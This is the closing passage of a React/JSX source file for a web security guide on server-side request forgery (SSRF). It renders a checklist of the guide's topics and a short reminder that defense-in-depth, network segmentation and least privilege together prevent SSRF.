            <ul className="grid md:grid-cols-2 gap-3 text-gray-200 mb-6">
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Understanding SSRF mechanics and attack vectors</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Detection and identification methodologies</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Exploitation techniques and bypass methods</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Real-world examples and case studies</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Prevention strategies across languages</span>
              </li>
              <li className="flex items-start">
                <span className="text-secondary-300 mr-2">✓</span>
                <span>Advanced topics and modern architectures</span>
              </li>
            </ul>
            <p className="text-gray-200">
              Remember: defense-in-depth is key. No single control is perfect. Combine application validation, network segmentation, least privilege, and continuous monitoring for effective SSRF prevention.
            </p>
          </div>
        </>
      ),
    },
  ],
}

export default guideContent
